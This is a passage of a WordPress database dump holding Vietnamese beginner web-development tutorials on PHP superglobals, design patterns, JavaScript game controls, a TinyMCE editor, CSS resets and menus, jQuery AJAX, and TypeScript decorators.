(516, 1, '2020-12-06 20:20:16', '2020-12-06 20:20:16', 'Trong PHP có một số loại biến gọi là siêu toàn cục superglobal, nó đã được PHP định nghĩa trước, bạn có thể truy cập bất kỳ lúc nào, và phạm vi truy cập là bất kỳ đâu.\n Hiện tại đó là các biến siêu toàn cục có tên sau: $_SERVER, $GLOBALS, $_REQUEST, $_POST, $_GET, $_FILES, $_ENV, $_COOKIE, $_SESSION\n\n<h2>1. Biến $_SERVER</h2>\n$_SERVER là một mảng chứa các thông tin do Webserver sinh ra như header, path, location script. \n<table>\n<tbody>\n<tr>\n<td>$_SERVER[\'QUERY_STRING\']</td>\n<td>Trả về chuỗi query trang đang truy cập. (V&iacute; dụ trang truy cập l&agrave; http://domain.com/?page=news&amp;id=100 - n&oacute; trả về l&agrave; chuỗi query l&agrave;&nbsp;?page=news&amp;id=100)</td>\n</tr>\n<tr>\n<td>$_SERVER[\'REQUEST_URI\']</td>\n<td>Trả về&nbsp;URI&nbsp;của trang.</td>\n</tr>\n<tr>\n<td>$_SERVER[\'HTTP_HOST\']</td>\n<td>Trả về&nbsp;Host&nbsp;của trang, v&iacute; dụ&nbsp;xuanthulab.net.</td>\n</tr>\n<tr>\n<td>$_SERVER[\'HTTP_REFERER\']</td>\n<td>Trang dẫn đến website của m&igrave;nh.&nbsp;C&oacute; thể d&ugrave;ng c&aacute;i n&agrave;y để biết người d&ugrave;ng v&agrave;o website qua google search với những từ kh&oacute;a n&agrave;o</td>\n</tr>\n<tr>\n<td>$_SERVER[\'SCRIPT_NAME\']</td>\n<td>Trả về đường dẫn của file script php hiện tại.</td>\n</tr>\n<tr>\n<td>$_SERVER[\'REQUEST_METHOD\']</td>\n<td>Trả về phương thức n&agrave;o truy vấn đến Server như&nbsp;POST, GET, HEAD, PUT</td>\n</tr>\n<tr>\n<td>$_SERVER[\'REQUEST_TIME\']</td>\n<td>Trả về gi&aacute; trị thời gian timestamp l&agrave; l&uacute;c bắt đầu y&ecirc;u cầu được gửi đến Server</td>\n</tr>\n<tr>\n<td>$_SERVER[\'HTTP_USER_AGENT\']</td>\n<td>Lấy User-Agent l&agrave; header của y&ecirc;u cầu gửi đến, qua c&aacute;i n&agrave;y c&oacute; thể biết được th&ocirc;ng tin như Tr&igrave;nh duyệt, Hệ điều h&agrave;nh, Thiết bị ... đang truy cập</td>\n</tr>\n<tr>\n<td>$_SERVER[\'REMOTE_ADDR\']</td>\n<td>Lấy IP đang truy cập trang.</td>\n</tr>\n</tbody>\n</table>\n\n<h2>2. Biến $GLOBALS, $_REQUEST, $_SESSION, $_COOKIE, $_POST, $_GET và $_files</h2>\n- $GLOBALS là một mảng chứa tất cả các tham chiếu đến các biến toàn cục (global). Với key của mảng là tên biến. Ví dụ bạn biết rằng $_SERVER là một biến toàn cục thì bạn có thể truy cập đến biến đó thông qua $GLOBALS[\'_SERVER\'] như là một cách thức mới.\n- $_REQUEST : Biến này là một mảng kết hợp, lưu trữ thông tin chứa trong biến $_GET, $_POST và $_COOKIE\n- Biến $_SESSION lưu trữ thông tin phiên làm việc của PHP, $_COOKIE dữ liệu nhỏ do trình duyệt gửi lên.\n', 'Các biến định nghĩa trước trong PHP', '', 'publish', 'open', 'open', '', 'url-trong-php', '', '', '2020-12-06 20:20:16', '2020-12-06 20:20:16', '', 0, 'http://duycode.com/?p=516', 0, 'post', '', 0),
(544, 1, '2020-12-15 06:10:22', '2020-12-15 06:10:22', '- Design Pattern là mẫu thiết kế chuẩn được tối ưu nhất khi thiết kế phần mềm. Được sử dụng trong tất cả các Library\r\n- Thiết kế theo Design Pattern có những lợi ích\r\n + Giảm thời gian code\r\n + Giảm lỗi\r\n + Dễ đọc\r\n + Dễ tái sử dụng\r\n\r\n<strong>Phân loại</strong>\r\n1. Creational Pattern - Nhóm khởi tạo\r\n- Signton: 1 class chỉ tạo 1 đối tượng duy nhất\r\n- Abstract Factory: Tạo interface cho nhiều class implement\r\n2. Structural Pattern - Nhóm Cấu trúc\r\n- Decorator: mở rộng thêm chức năng khi chạy\r\n3. Behavioral Pattern - Nhóm hành vi\r\n- Command: hành vi ghi log\r\n- Iterator: truy xuất các đối tượng trong 1 tập hợp\r\n\r\n**. Architectural Pattern (Nhóm kiến trúc hệ thống): không được xếp loại\r\n- Hay gặp nhất là MVC', 'Design Pattern: Tổng quan', '', 'publish', 'open', 'open', '', 'javascript-countdow', '', '', '2023-06-17 14:46:21', '2023-06-17 14:46:21', '', 0, 'http://duycode.com/?p=544', 0, 'post', '', 0),
(547, 1, '2020-12-15 06:15:35', '2020-12-15 06:15:35', '<h2>Tạo Class</h2>\n<pre>\nclass Controller {\n    constructor() {\n    }\n\n    static delayControl(normalControl,delayControl,beforeDelay,timeDelay){\n        let beforeControl = 0;\n        let timeTouch = 0;\n        let id = null;\n        let loops;\n\n        let loopTimer = () => {\n            beforeControl = beforeControl + 5;\n            timeTouch = timeTouch + 5;\n            loops = setTimeout(()=>loopTimer(),5);\n        };\n        loopTimer();\n\n        let checkTouchDevice = () => {\n            return \'ontouchstart\' in document;\n        };\n\n        if(checkTouchDevice()){\n            document.addEventListener(\"touchstart\", (event) => {\n                id = event.target.id;\n                if(id in normalControl) normalControl[id]();\n            });\n            document.addEventListener(\"touchend\", () => {\n                id = null;\n            });\n        }\n        else {\n            document.addEventListener(\"mousedown\", (event) => {\n                id = event.target.id;\n                if(id in normalControl) normalControl[id]();\n            });\n            document.addEventListener(\"mouseup\", () => {\n                id = null;\n            });\n\n            document.addEventListener(\'keydown\',(event)=>{\n                id = event.code;\n                if(id in normalControl) normalControl[id]();\n            },true);\n            document.addEventListener(\'keyup\',()=>{\n                id = null;\n            },true);\n        }\n\n        let listenDelayControl = ()=>{\n            if(id in delayControl){\n                if(beforeControl > beforeDelay){\n                    delayControl[id]();\n                    timeTouch = 0;\n                }\n                else if(timeTouch > timeDelay){\n                    delayControl[id]();\n                }\n                beforeControl = 0;\n            }\n            setTimeout(()=>listenDelayControl(),5);\n        };\n        listenDelayControl();\n    }\n}\n\n</pre>\n\n<h2>Sử dụng</h2>\n<pre>\nController.delayControl(\n     {\n         ArrowDown: () => this.brick.moveDown(),\n         ArrowUp: () => this.brick.rotate(),\n         Space: () => this.pauseGame(),\n         Enter: () => this.nextGame(),\n         \"myCanvas\": () => this.pauseGame(),\n         \"moveDown\": ()=> this.brick.moveDown(),\n         \"Rotate\": ()=> this.brick.rotate()\n     },\n     {\n         ArrowLeft: () => this.brick.moveLeft(),\n         ArrowRight: () => this.brick.moveRight(),\n         \"moveLeft\": ()=> this.brick.moveLeft(),\n         \"moveRight\": ()=> this.brick.moveRight()\n     },40,200);\n\n</pre>', 'JavaScript - Cấu hình Keyboard để làm Game', '', 'publish', 'open', 'open', '', 'javascript-cau-hinh-keyboard-de-lam-game', '', '', '2020-12-15 06:15:35', '2020-12-15 06:15:35', '', 0, 'http://duycode.com/?p=547', 0, 'post', '', 0),
(549, 1, '2020-12-15 06:53:46', '2020-12-15 06:53:46', '<pre>\n<textarea name=\"post_content\" placeholder=\"Write content Here\" id=\"post_content\"></textarea>\n\n<script src=\"//cdnjs.cloudflare.com/ajax/libs/tinymce/4.5.1/tinymce.min.js\"></script>\n<script type=\"text/javascript\">\n    tinymce.init({\n        selector: \'#post_content\',\n        height: 400,\n        theme: \'modern\',\n        plugins: [\n            \'advlist autolink lists link image charmap print preview hr anchor pagebreak\',\n            \'searchreplace wordcount visualblocks visualchars code fullscreen\',\n            \'insertdatetime media nonbreaking save table contextmenu directionality\',\n            \'emoticons template paste textcolor colorpicker textpattern imagetools\'\n        ],\n        toolbar1: \'insertfile undo redo | styleselect | forecolor backcolor emoticons | bullist numlist | outdent indent\',\n        toolbar2: \'preview | source code | link image media | table\',\n        image_advtab: true\n    });\n</script>\n</pre>', 'JavaScript - WYSIWYG HTML Editor', '', 'publish', 'open', 'open', '', 'javascript-editbox-html', '', '', '2020-12-15 06:53:46', '2020-12-15 06:53:46', '', 0, 'http://duycode.com/?p=549', 0, 'post', '', 0),
(554, 1, '2020-12-15 16:23:02', '2020-12-15 09:23:02', '<h2>1. CSS reset</h2>\r\n<pre>\r\n* {\r\n    margin: 0;\r\n    padding: 0;\r\n    box-sizing: border-box;\r\n}\r\n\r\nimg {\r\n    max-width: 100%;\r\n}\r\n\r\nol,\r\nul,\r\nli {\r\n    list-style-type: none;\r\n    list-style-position: inside;\r\n}\r\n\r\ntable {\r\n    border-collapse: collapse;\r\n    border-spacing: 0;\r\n}\r\n\r\ninput {\r\n    outline: none;\r\n}\r\n\r\na,\r\nbutton,\r\nselect,\r\ninput[type=\"checkbox\"],\r\ninput[type=\"submit\"] {\r\n    cursor: pointer;\r\n}\r\n\r\nsummary {\r\n    cursor: pointer;\r\n    user-select: none;\r\n}\r\n\r\npre,\r\ncode {\r\n    font-family: monospace, monospace;\r\n}\r\n</pre>\r\n\r\n<h2>2. CSS Base</h2>\r\n<pre>\r\nbody {\r\n    font-family: Arial, sans-serif;\r\n    font-size: 14px;\r\n}\r\n\r\n.container {\r\n    width: 1200px;\r\n    max-width: 100%;\r\n    margin: 0 auto;\r\n}\r\n</pre>', 'CSS Reset - CSS Base', '', 'publish', 'open', 'open', '', 'css-reset-css-base', '', '', '2022-08-20 04:17:39', '2022-08-20 04:17:39', '', 0, 'http://duycode.com/?p=554', 0, 'post', '', 0),
(556, 1, '2020-12-15 17:59:19', '2020-12-15 17:59:19', '<h2>1. File index.html</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html>\r\n\r\n<head>\r\n    <meta charset=\"utf-8\">\r\n    <title>MediHome Index</title>\r\n    <meta name=\"description\" content=\"\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\r\n    <link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css\">\r\n    <link href=\"https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,500;1,400;1,500&display=swap\"\r\n        rel=\"stylesheet\">\r\n    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\"></script>\r\n</head>\r\n\r\n<body>\r\n    <header>\r\n        <div class=\"topnav\" id=\"myTopnav\">\r\n            <div class=\"dropdown\">\r\n                <div><i class=\"fa fa-home\"></i> Home </div>\r\n            </div>\r\n            <div class=\"dropdown\">\r\n                <div>News</div>\r\n            </div>\r\n            <div class=\"dropdown\">\r\n                <div class=\"dropdown-title\">Dịch vụ</div>\r\n                <div class=\"dropdown-content\">\r\n                    <div class=\"drop2\">\r\n                        <div class=\"drop2-title\">Chăm sóc tại nhà</div>\r\n                        <div class=\"drop2-content\">\r\n                            <div class=\"drop3\">\r\n                                <div class=\"drop3-title\">Nhân viên y tế tại nhà</div>\r\n                            </div>\r\n                            <div class=\"drop3\">\r\n                                <div class=\"drop3-title\">Xét nghiệm tại nhà</div>\r\n                            </div>                          \r\n                        </div>\r\n                    </div>\r\n                    <div class=\"drop2\">\r\n                        <div>Xe cấp cứu</div>\r\n                    </div>\r\n                    <div class=\"drop2\">\r\n                        <div class=\"drop2-title\">Làm đẹp</div>\r\n                        <div class=\"drop2-content\">\r\n                            <div class=\"drop3\">\r\n                                <div class=\"drop3-title\">Tư vấn, chăm sóc da</div>\r\n                            </div>\r\n                            <div class=\"drop3\">\r\n                                <div class=\"drop3-title\">Phẫu thuật thẩm mỹ</div>\r\n                            </div>  \r\n                            <div class=\"drop3\">\r\n                                <div class=\"drop3-title\">Trung tâm MediSpa</div>\r\n                            </div>  \r\n                        </div>\r\n                    </div>\r\n                    <div class=\"drop2\">\r\n                        <div>Phần mềm quản lý bệnh nhân</div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n            <div class=\"dropdown\">\r\n                <div class=\"dropdown-title\">Thiết bị y tế</div>\r\n                <div class=\"dropdown-content\">\r\n                    <div class=\"drop2\">\r\n                        <div>Thuê máy thở, máy trợ thở</div>\r\n                    </div>\r\n                    <div class=\"drop2\">\r\n                        <div>Cửa hàng thiết bị y tế</div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n            <div class=\"dropdown\">\r\n                <div class=\"dropdown-title\">Kiến thức y khoa</div>\r\n                <div class=\"dropdown-content\">\r\n                    <div class=\"drop2\">\r\n                        <div>Đột quỵ não</div>\r\n                    </div>\r\n                    <div class=\"drop2\">\r\n                        <div>Dinh dưỡng</div>\r\n                    </div>\r\n                    <div class=\"drop2\">\r\n                        <div>Thở máy tại nhà</div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n            <div class=\"dropdown\">\r\n                <div>Liên hệ </div>\r\n            </div>\r\n            <div class=\"dropdown\">\r\n                <div>Tìm kiếm </div>\r\n            </div>\r\n            <div class=\"dropdown icon-menu\">\r\n                <div><i class=\"fa fa-bars\"></i></div>\r\n            </div>\r\n        </div>\r\n\r\n    </header>\r\n    <main>\r\n    </main>\r\n    <footer>\r\n\r\n    </footer>\r\n\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. File css/style.css</h2>\r\n<pre>\r\n* {\r\n    margin: 0;\r\n    padding: 0;\r\n    border: 0;\r\n    font-size: 100%;\r\n    box-sizing: border-box;\r\n    -moz-box-sizing: border-box;\r\n    -webkit-box-sizing: border-box;\r\n}\r\n\r\nbody {\r\n    max-width: 1200px;\r\n    margin: 0 auto;\r\n    font-family: \'Roboto\', Arial, Tahoma, sans-serif;\r\n}\r\n\r\n/* ------------------menu-topnav------------------ */\r\n\r\n.topnav {\r\n    display: flex;\r\n    flex-direction: column;\r\n    position: relative;\r\n    font-size: 17px;\r\n    background-color: #333;\r\n}\r\n\r\n.dropdown.icon-menu {\r\n    position: absolute;\r\n    right: 0;\r\n    top: 0;\r\n    background-color: #444;\r\n}\r\n\r\n.dropdown:not(:first-child):not(:last-child) {\r\n    cursor: pointer;\r\n    display: none;\r\n}\r\n\r\n.dropdown>div:first-child {\r\n    font-size: 17px;\r\n    color: #f2f2f2;\r\n    padding: 14px 16px;\r\n}\r\n\r\n.drop2>div:first-child, .drop3>div:first-child {\r\n    font-size: 17px;\r\n    color: black;\r\n    padding: 14px 16px;\r\n}\r\n\r\n.dropdown:first-child>div {\r\n    background-color: #4CAF50;\r\n}\r\n\r\n.dropdown .dropdown-title:hover, .dropdown-title.active {\r\n    background-color: #444;\r\n}\r\n\r\n.drop2:hover>div:first-child, .drop2>.drop2-title.active {\r\n    background-color: #666;\r\n    color: white;\r\n}\r\n\r\n.drop3:hover>div:first-child {\r\n    background-color: #888;\r\n    color: white;\r\n}\r\n\r\n.dropdown-title::after {\r\n    font-family: \"FontAwesome\";\r\n    content: \'\\f067\';\r\n    color: #fff;\r\n    float: right;\r\n    margin-left: 5px;\r\n    transition: 0.2s;\r\n}\r\n\r\n.dropdown-title.active::after,\r\n.dropdown-title.active.show-hover.clicked::after {\r\n    font-family: \"FontAwesome\";\r\n    content: \'\\f068\';\r\n    transition: 0.2s;\r\n    transform: rotate(180deg);\r\n}\r\n\r\n.drop2-title::after {\r\n    font-family: \"FontAwesome\";\r\n    content: \'\\f0da\';\r\n    color: black;\r\n    float: right;\r\n    margin-left: 5px;\r\n    transition: 0.2s;\r\n}\r\n\r\n.drop2-title:hover::after {\r\n    color: white;\r\n    transition: 0s;\r\n}\r\n\r\n.drop2-title.clicked:hover::after {\r\n    color: white;\r\n    transition: 0.2s;\r\n}\r\n\r\n.drop2-title.active::after {\r\n    color: white;\r\n    transform: rotate(90deg);\r\n    transition: 0.2s;\r\n}\r\n\r\n.drop3-title::before {\r\n    content: \'---\';\r\n    color: black;\r\n    margin-left: 10px;\r\n    margin-right: 10px;\r\n}\r\n.drop3-title:hover::before{\r\n    color:white;\r\n}\r\n\r\n.dropdown-content, .drop2-content {\r\n    display: none;\r\n    position: relative;\r\n    background-color: white;\r\n    box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.2);\r\n}\r\n\r\n/* -------------Design for tablets------------- */\r\n\r\n@media screen and (min-width: 768px) {}\r\n\r\n/* -------------Design for desktop------------- */\r\n\r\n@media screen and (min-width: 800px) {\r\n    .topnav {\r\n        flex-direction: row;\r\n    }\r\n    .topnav>div:not(:first-child):not(:last-child) {\r\n        display: block;\r\n        position: relative;\r\n    }\r\n    .dropdown-title::after, .dropdown-title.active.show-hover::after {\r\n        font-family: \"FontAwesome\";\r\n        content: \'\\F0D7\';\r\n        margin-left: 10px;\r\n        margin-top: 2px;\r\n        transform: rotate(0deg);\r\n    }\r\n    .dropdown-content {\r\n        position: absolute;\r\n        min-width: 250px;\r\n        z-index: 1;\r\n    }\r\n    .dropdown-content>div {\r\n        position: relative;\r\n    }\r\n    .drop2-content {\r\n        position: absolute;\r\n        left: 250px;\r\n        top: 0;\r\n        min-width: 250px;\r\n        z-index: 1;\r\n    }\r\n    .drop2-content a::before {\r\n        content: \'---\';\r\n        color: black;\r\n        margin-right: 5px;\r\n        margin-left: 5px;\r\n    }\r\n}\r\n\r\n/* -------------Design for large desktop------------- */\r\n\r\n@media screen and (min-width: 1200px) {}\r\n</pre>\r\n\r\n<h2>3. File js/view.js</h2>\r\n<pre>\r\n$(document).ready(function () {\r\n\r\n    $toggleMenuBar(\".dropdown\");\r\n    $toggleMenuBar(\".drop2\");\r\n\r\n    $(\'.icon-menu\').click(function (e) {\r\n        $(this).parent().children().not(\':first,:last\').slideToggle(150);\r\n        e.stopPropagation();\r\n    });\r\n\r\n    $(\'body\').click(function () {\r\n        if ($(window).width() < 800) {\r\n            $(\".topnav\").children().not(\':first,:last\').slideUp(150);\r\n        }\r\n    });\r\n});\r\n\r\n$toggleMenuBar = (dropMenu) => {\r\n    $(dropMenu + \"-title\").click(function (e) {\r\n        if ($(this).hasClass(\"show-hover\")==false||$(this).hasClass(\"clicked\")==true) {\r\n            $(this).toggleClass(\"active\");\r\n            $(this).next().slideToggle(200);\r\n        }\r\n\r\n        $(this).addClass(\"clicked\");\r\n        $(dropMenu + \"-title.clicked\").not($(this)).removeClass(\"clicked\");\r\n        $(this).next().css(\"z-index\", \"initial\");\r\n\r\n        $(dropMenu + \"-title.active\").not($(this)).next().slideToggle(200);\r\n        $(dropMenu + \"-title.active\").not($(this)).toggleClass(\"active\");\r\n        e.stopPropagation();\r\n    });\r\n\r\n    $(dropMenu).hover(\r\n        function () {\r\n            $title = $(this).children(dropMenu + \"-title\");\r\n            $content = $(this).children(dropMenu + \"-content\");\r\n            if ($(window).width() < 800) return;\r\n            if ($title.hasClass(\"active\") == false && $title.hasClass(\"clicked\") == false) {\r\n                $title.addClass(\"show-hover\");\r\n                $title.toggleClass(\"active\");\r\n                $content.toggle();\r\n                $content.css(\"z-index\", \"99\")\r\n            }\r\n            e.stopPropagation();\r\n\r\n        },\r\n        function () {\r\n            $title = $(this).children(dropMenu + \"-title\");\r\n            $content = $(this).children(dropMenu + \"-content\");\r\n            if ($(window).width() < 800) {\r\n                $title.removeClass(\"clicked\");\r\n                return;\r\n            }\r\n            if ($title.hasClass(\"show-hover\") == true && $title.hasClass(\"clicked\") == false) {\r\n                $title.toggleClass(\"active\");\r\n                $content.toggle();\r\n                $content.css(\"z-index\", \"initial\");\r\n            }\r\n            $title.removeClass(\"show-hover\").removeClass(\"clicked\");\r\n            e.stopPropagation();\r\n        }\r\n    );\r\n}\r\n</pre>', 'Tạo Menu Bar - Có Reponsive, Dropdown 2 lớp', '', 'publish', 'open', 'open', '', 'tao-menu-bar-co-reponsive-dropdown-2-lop', '', '', '2023-06-03 17:57:12', '2023-06-03 17:57:12', '', 0, 'http://duycode.com/?p=556', 0, 'post', '', 0),
(559, 1, '2020-12-16 22:08:19', '2020-12-16 15:08:19', '<pre>\n<!DOCTYPE html>\n<html>\n\n<head>\n    <meta charset=\"utf-8\">\n    <style type=\"text/css\">\n        body {\n            margin: 0;\n        }\n\n        h2 {\n            text-align: center;\n        }\n\n        .topnav {\n            overflow: hidden;\n            background-color: #333;\n        }\n\n        .topnav a {\n            float: left;\n            display: block;\n            color: #f2f2f2;\n            text-align: center;\n            padding: 14px 16px;\n            text-decoration: none;\n            font-size: 17px;\n        }\n\n        .topnav a:hover {\n            background-color: #5C5C5C;\n        }\n\n        .topnav .icon {\n            display: none;\n        }\n\n        @media screen and (max-width: 768px) {\n            .topnav a:not(:first-child) {\n                display: none;\n            }\n\n            .topnav a.icon {\n                float: right;\n                display: block;\n            }\n\n            .topnav.responsive {\n                position: relative;\n            }\n\n            .topnav.responsive .icon {\n                position: absolute;\n                right: 0;\n                top: 0;\n            }\n\n            .topnav.responsive a {\n                float: none;\n                display: block;\n                text-align: left;\n            }\n        }\n    </style>\n    <script>\n        function myFunction() {\n            var x = document.getElementById(\"myTopnav\");\n            if (x.className === \"topnav\") {\n                x.className += \" responsive\";\n            } else {\n                x.className = \"topnav\";\n            }\n        }\n    </script>\n</head>\n\n<body>\n    <h2>Hướng dẫn tạo responsive navbar</h2>\n    <div class=\"topnav\" id=\"myTopnav\">\n        <a href=\"#home\">Trang chủ</a>\n        <a href=\"#news\">Học lập trình online</a>\n        <a href=\"#contact\">Thủ thuật</a>\n        <a href=\"#about\">Liên hệ</a>\n        <a href=\"javascript:void(0);\" style=\"font-size:15px;\" class=\"icon\" onclick=\"myFunction()\">&#9776;</a>\n    </div>\n\n    <div style=\"padding-left:16px\">\n        <p>Thay đổi kích cỡ màn hình để xem hiệu ứng!</p>\n    </div>\n</body>\n\n</html>\n</pre>', 'CSS Reponsive Menu', '', 'publish', 'open', 'open', '', 'css-reponsive-menu', '', '', '2020-12-16 22:08:19', '2020-12-16 15:08:19', '', 0, 'http://duycode.com/?p=559', 0, 'post', '', 0),
(575, 1, '2020-12-27 03:48:54', '2020-12-27 03:48:54', '<h2>1. Tổng quan</h2>\n<h3>1.1. Method: GET</h3>\n<pre>\n$.ajax({\n    \'url\': \"http://localhost:3000/admin/users/list\",\n    \'method\': \"GET\",\n    \'contentType\': \'application/json\'\n})\n    .done(function (result) {\n    })\n    .fail(function (error) {\n    })\n    .always(function () {\n    });\n</pre>\n\n\n\n<h3>2.1. Phương thức AJAX với dữ liệu trả về dạng html</h3>\n<pre>\n$.ajax({\n    type: \'POST\',\n    url: \'vidu.php\',\n    dataType: \'html\',\n    data: {\n        abc: \"content abc\",\n        def: \"content def\"\n    }\n}).done(function(ketqua) {\n    $(\'#noidung\').html(ketqua);\n});\n\n\n\n\n</pre>\n-- File: vidu.php\n<pre>\n<?php\nif (isset($_POST[\'id\'])) {\n    echo \'Bạn đã gửi dữ liệu ID = \' . $_POST[\'id\'] . \' thành công\';\n} else {\n    echo \'Không có dữ liệu được gửi sang\';\n}\n?>\n</pre>\n<h3>2.2. Phương thức AJAX với dữ liệu trả về dạng JSON</h3>\n<pre>\n$.ajax({\n    type: \'POST\',\n    url: \'data.php\',\n    data: {\n        id: \"1\",\n    },\n    dataType: \'json\',\n    success: function(data) {\n        if (data.complate == \'1\') {\n            alert(\'Có dữ liệu gửi sang\');\n        } else {\n            alert(\'Không có dữ liệu gửi sang\');\n        }\n    },\n    error: function() {\n        alert(\'Có lỗi trong quá trình xử lý\');\n    }\n});\n</pre>\n\n-- File: data.php\n<pre>\n<?php\n$data = array(); \nif(isset($_POST[\'id\']))\n{\n    $data[\'complate\'] = \'1\';\n}else{\n    $data[\'complate\'] = \'0\';\n}\necho json_decode($data);\n?>\n</pre>\n\n<h2>2. Ví dụ cách xử lý AJAX trên 1 trang</h2>\n-- Ví dụ 1:\n<pre>\n<?php\nif (isset($_POST[\'ajax\']) && isset($_POST[\'name\'])) {\n    echo $_POST[\'name\'];\n    exit;\n}\n?>\n\n<!doctype html>\n<html>\n<body>\n    <input type=\'text\' name=\'name\' placeholder=\'Write here !!!\' id=\'name\'>\n    <div id=\'response\'></div>\n    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script>\n    <script>\n        $(document).ready(function() {\n            $(\'#name\').keyup(function() {\n                var value = $(\'#name\').val();\n                $.ajax({\n                    type: \'post\',\n                    data: {\n                        ajax: 1,\n                        name: value\n                    },\n                    success: function(response) {\n                        $(\'#response\').text(\'You wrote : \' + response);\n                    }\n                });\n            });\n        });\n    </script>\n</body>\n</html>\n</pre>\n\n-- Ví dụ 2\n<pre>\n<?php\nif (isset($_POST[\'ajax\']) && isset($_POST[\'checked\'])) {\n    $checked_arr = $_POST[\'checked\'];\n\n    echo json_encode($checked_arr);\n    exit;\n}\n?>\n\n<!doctype html>\n<html>\n<body>\n\n    <form method=\'post\' action>\n        <input type=\'checkbox\' value=\'JavaScript\'> JavaScript <br />\n        <input type=\'checkbox\' value=\'PHP\'> PHP <br />\n        <input type=\'checkbox\' value=\'jQuery\'> jQuery <br />\n        <input type=\'checkbox\' value=\'AJAX\'> AJAX <br />\n        <input type=\'button\' value=\'click\' id=\'but\'>\n        <div id=\'response\'></div>\n    </form>\n    <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script>\n\n    <script>\n        $(document).ready(function() {\n            $(\'#but\').click(function() {\n                var checkarr = [];\n                $(\"input[type=checkbox]:checked\").each(function(index, element) {\n                    checkarr.push($(element).val());\n                });\n                if (checkarr.length > 0) {\n                    $.ajax({\n                        type: \'post\',\n                        data: {\n                            ajax: 1,\n                            checked: checkarr\n                        },\n                        dataType: \'json\',\n                        success: function(response) {\n                            $(\'#response\').text(\'Response : \' + JSON.stringify(response));\n                        }\n                    });\n                }\n            });\n        });\n    </script>\n</body>\n</html>\n</pre>', 'AJAX - Asynchronous JavaScript and XML', '', 'publish', 'open', 'open', '', 'ajax-asynchronous-javascript-and-xml', '', '', '2020-12-27 03:48:54', '2020-12-27 03:48:54', '', 0, 'http://duycode.com/?p=575', 0, 'post', '', 0),
(579, 1, '2022-10-27 04:29:31', '2022-10-27 04:29:31', '<pre>\r\nimport \"reflect-metadata\";\r\nconst formatMetadataKey = Symbol(\"format\");\r\nconst requiredMetadataKey = Symbol(\"required\");\r\n\r\n// Class Decorator\r\nconst Entity = (options: { stdName?: string, tblName?: string }) => (target: Function & typeof BaseEntities) => {\r\n    target.prototype.studentName = options.stdName\r\n    target.tableName = options.tblName\r\n}\r\n\r\n// Property Decorator\r\nconst CreatedAt = (options: { format?: string }) => (target: Object, propertyName: string) => {\r\n    let time = new Date();\r\n    const getter = () => {\r\n        let value: string | number\r\n        if (options.format === \'getTime\') {\r\n            value = time.getTime()\r\n        }\r\n        if (options.format === \'toLocaleString\') {\r\n            value = time.toLocaleString()\r\n        }\r\n        return value\r\n    }\r\n    const setter = (value: string | number) => {\r\n        console.log(\"Start edit to:\", value)\r\n        time = new Date(value)\r\n    }\r\n    Object.defineProperty(target, propertyName, { get: getter, set: setter })\r\n}\r\n\r\n// Method Decorator\r\nconst PrintJSON = (options: { indent: number }) => (target: Object, propertyKey: string, propertyDescriptor: PropertyDescriptor) => {\r\n    const originMethod = propertyDescriptor.value\r\n    propertyDescriptor.value = function (...args: any[]) {\r\n        // const result = originMethod.apply(this, args)\r\n        const result = originMethod.call(this, ...args)\r\n        result.create_at = this.create_at\r\n        return JSON.stringify(result, null, options.indent)\r\n    }\r\n    return propertyDescriptor\r\n}\r\n\r\n// Params Decorator\r\nconst ConvertTime = (options: { format: string }) => (target: Object, propertyKey: string, parameterIndex: number) => {\r\n    let existingRequiredParameters: number[] = Reflect.getOwnMetadata(requiredMetadataKey, target, propertyKey) || [];\r\n    existingRequiredParameters.push(parameterIndex);\r\n    Reflect.defineMetadata(requiredMetadataKey, existingRequiredParameters, target, propertyKey);\r\n    console.log({ target, propertyKey, parameterIndex, options, requiredMetadataKey, existingRequiredParameters })\r\n    // Loằng ngoằng, cái Reflect này chưa hiểu\r\n}\r\n\r\nclass BaseEntities {\r\n    static tableName: string\r\n    studentName: string\r\n}\r\n\r\n@Entity({ stdName: \"Ngô Nhật Dương\", tblName: \"table_student\" })\r\nclass StudentEntities extends BaseEntities {\r\n    @CreatedAt({ format: \'getTime\' })\r\n    create_at: string | number\r\n\r\n    @PrintJSON({ indent: 4 })\r\n    printData(@ConvertTime({ format: \'getTime\' }) printDate: string) {\r\n        return { studentName: this.studentName, printDate }\r\n    }\r\n}\r\n\r\nconst student1 = new StudentEntities()\r\nconsole.log(\"Entity infomation:\", student1.studentName, StudentEntities.tableName)\r\nconsole.log(\"Student infomation: create_at =\", student1.create_at)\r\nstudent1.create_at = \'11/12/2005, 10:31:23 PM\'\r\nconsole.log(\"Student after edit: create_at =\", student1.create_at)\r\nconsole.log(\"Student printData:\", student1.printData(new Date().toString()))\r\n</pre>', 'TypeScript - Decorators', '', 'publish', 'open', 'open', '', 'json-javascript-object-notation', '', '', '2022-11-12 18:20:44', '2022-11-12 18:20:44', '', 0, 'http://duycode.com/?p=579', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
